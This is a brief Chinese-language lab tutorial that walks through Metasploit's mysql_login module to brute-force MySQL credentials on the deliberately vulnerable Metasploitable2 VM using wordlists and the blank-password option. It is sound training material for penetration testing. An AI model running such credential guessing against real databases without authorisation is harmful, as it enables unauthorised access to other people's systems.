## 暴力破解Mysql密码
0、工具
- metasploit3

1、不多说，mysql服务也是开启的，进入metasploit3 shell环境
```bash
[root@kali: ~#]msfconsole
msf > search mysql
auxiliary/scanner/mysql/mysql_login                                    normal     MySQL Login Utility
#找到mysql登录辅助模块
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > show options
Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
msf auxiliary(mysql_login) > set RHOSTS metasploitable2
#设置用户名和密码的文件，这个我就建在当前目录下，也是利用的ssh暴力破解用的用户密码文件
msf auxiliary(mysql_login) > set USER_FILE ./user.txt
msf auxiliary(mysql_login) > set PASS_FILE ./passwd.txt
msf auxiliary(mysql_login) > set STOP_ON_SUCCESS true
#这个空密码注意打开，老版本的mysql默认是没有密码的，新版本安装完默认会生成一个密码的
msf auxiliary(mysql_login) > set BLANK_PASSWORDS true
msf auxiliary(mysql_login) > exploit
#如果用户密码很多，可能需要等很久滴！！！！
#继续进入下一步
```

ps: metasploitable2的mysql默认没有密码的